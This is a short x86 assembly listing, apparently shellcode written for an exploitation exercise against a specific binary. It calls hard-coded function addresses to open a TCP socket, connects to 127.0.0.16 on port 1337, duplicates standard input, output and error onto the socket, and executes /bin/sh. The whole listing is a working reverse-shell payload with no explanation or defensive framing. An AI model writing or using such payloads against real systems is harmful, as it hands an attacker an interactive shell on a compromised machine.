sub esp, 200

JMP _WANT_BIN_BASH

_GOT_BIN_BASH:
push 0
push 1
push 2
mov eax, 0x08049170
call eax
add esp, 12
push eax

push 0x1000007f
push 0x39050002
push 16
lea eax, [esp+4]
push eax
push [esp+16]
mov eax, 0x08049190
call eax
add esp, 20

mov ecx, 2
_dup2_loop:
push ecx
push [esp+4]
mov eax, 0x08049040
call eax
add esp, 8
dec ecx
jns _dup2_loop
add esp, 4

pop ebx
push 0
push ebx
mov ecx, esp
push 0
push ecx
push ebx
mov eax, 0x08049110
call eax

_WANT_BIN_BASH:
CALL _GOT_BIN_BASH
.STRING "/bin/sh"
